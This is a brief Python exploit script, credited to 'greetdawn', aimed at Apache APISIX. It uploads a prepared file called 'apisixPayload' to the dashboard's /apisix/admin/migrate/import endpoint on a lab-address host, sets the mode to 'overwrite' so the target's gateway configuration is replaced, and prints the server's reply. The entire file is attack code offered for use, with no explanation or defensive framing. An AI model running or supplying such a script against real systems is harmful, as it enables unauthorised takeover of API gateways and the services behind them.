#!/usr/local/env python3
# -*- coding: utf-8 -*-
# author: greetdawn

import requests

url = "http://192.168.32.132:9000/apisix/admin/migrate/import"

files = {"file": open("apisixPayload", "rb")}

res = requests.post(url = url, data = {"mode": "overwrite"}, files = files)

print(res.status_code)
print(res.text)